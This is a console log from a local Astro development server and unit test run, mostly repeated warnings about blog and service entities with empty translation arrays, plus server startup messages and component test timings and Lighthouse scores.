[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d50fda7c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ffbc9923 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13446ffe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18e50657 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-15e2a589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d5304933 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dbd0a284 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b44634f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-740e7a11 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-728293f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7890a594 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5c8b291f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-522ed44d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-869af36d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d413dd8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38b50d5d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47528800 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-21cf0b9a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f81acf1a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f3ddeab5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-120d5cac has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2d3ff5a3 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-88ebbd55 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5fed9429 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1066ee9f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1e5b258b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-374f73f0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c13580f2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b41de161 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d20767f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13017b6d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4fa98cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-58c974ff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acf1541e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38d95f75 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6a80558 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39536420 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ec51a1d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-83c379d1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-198755b4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d1fc560 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2859c74b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c37c2433 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3ad7e563 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2368a3a2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-0a631f1e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98339492 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6cc6d20 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-17ea2aad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f544f37 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ad4b1452 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1beb50d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-257c96da has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bf93e13f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-69be50ea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-11e90d7b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d26859a0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-44ebf015 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d81e3f7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-10281057 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4dadbcc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4fc5c4de has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7443bbd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e34a43d2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9216e86e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e5ab8d0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-655d9b87 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1dd4e1fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d6eceb9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:23:44[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-41579eef has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:23:44[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 13 localized entries in Astro Content Layer.
[2m20:23:44[22m [34m[content][39m Synced content
[2m20:23:44[22m [34m[content][39m Synced content

[42m[1m astro [22m[49m [32mv5.18.0[39m [2mready in[22m 25455 [2mms[22m

[2mÔöâ[22m Local    [36mhttp://localhost:4321/[39m
[2mÔöâ[22m Network  [2muse --host to expose[22m

[2m20:23:44[22m [32mwatching for file changes...[39m
[2m20:23:44[22m [34m[vite][39m Port 4321 is in use, trying another one...

[42m[1m astro [22m[49m [32mv5.18.0[39m [2mready in[22m 27749 [2mms[22m

[2mÔöâ[22m Local    [36mhttp://localhost:4322/[39m
[2mÔöâ[22m Network  [2muse --host to expose[22m

[2m20:23:44[22m [32mwatching for file changes...[39m
[90mstdout[2m | tests/unit/components/Accordion/AccordionItem.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts[2m > [22m[2mui/Alert[2m > [22m[2mlighthouse: default alert
[22m[39mLighthouse Alert Scores: { performance: [33m0[39m, accessibility: [33m96[39m, bestPractices: [33m100[39m, seo: [33m60[39m }

[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts[2m > [22m[2mui/Alert[2m > [22m[2mstress: renders 1000 alerts without performance degradation
[22m[39mÔ£ô Rendered 1000 alerts in 1813.39ms

[90mstdout[2m | tests/unit/components/Button/Button.test.ts[2m > [22m[2mui/Button[2m > [22m[2mlighthouse: default button
[22m[39mLighthouse Scores: { performance: [33m0[39m, accessibility: [33m96[39m, bestPractices: [33m100[39m, seo: [33m60[39m }

[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts[2m > [22m[2mui/Alert[2m > [22m[2mperformance: renders 1000 alerts sequentially
[22m[39mÔ£ô Rendered 1000 alerts in 1426.76ms

[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s
[2m20:24:16[22m [33m[302][39m / [2m15949ms[22m
[2m20:24:21[22m [34m[astro-icon][39m Loaded icons from src/icons, circle-flags, mdi, openmoji
[2m20:24:24[22m [34m[types][39m Generated [2m12ms[22m
[2m20:24:38[22m [34m[200][39m /fr/ [2m307ms[22m
[90mstdout[2m | tests/unit/components/Accordion/AccordionItem.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  suppress all logs with { quiet: true }
[2m20:24:39[22m [34m[content][39m Syncing content
[2m20:24:39[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:24:39[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:24:39[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 39 parent entities.
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-ef3f9808 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-3d0f20d6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-13267693 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-f0ff1376 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-9bb2241b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-153bc25a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-829b3c9d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-75b7467c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-4d7685e6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1974855c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-aec14411 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1aa84786 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-cb8cc996 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:24:39[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 60 localized entries in Astro Content Layer.
[2m20:24:39[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 164 parent entities.
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3cdaa9fb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fd8e4bc4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-33fb5d39 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-35db7427 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d5a4adf has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3324e589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3dbba740 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4f84b975 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c6bd8108 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6e434fad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4445fe7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-210de9b1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7774cf90 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dc7ba910 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-394f1543 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-52a7de43 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bfaab9c6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-725a5050 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db84c061 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f637349 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9895c9db has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f6c6f302 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-773f0211 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6c6267cd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d525a37b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47085c49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6fdf587a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-aa465471 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-34efb0dc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c1421460 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1a0b4cb0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9531d171 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b7f4d73a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7f7ca00 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5bbf47fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8e054462 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a01cf796 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7aaf63f5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4c3f3986 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98e12337 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2c394312 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d99e5924 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5e5fa063 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a209cf34 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ebde45c8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b902dd5e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6bd4a782 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18ca384f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c16b8687 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b9f0a49e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d439c329 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acd54078 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b5252eff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-895714b0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b4d5ca49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d207bac7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fae34b96 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5248e68e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39e22a61 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b6dea38b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-76b83851 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b58ee3b2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-afd81398 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e7c73a7f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-663a4445 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-960a3a6f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-90f2c4c9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-59fe6d1d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db4f9df2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f889093e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-45012c0c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-be30a165 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b151570e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
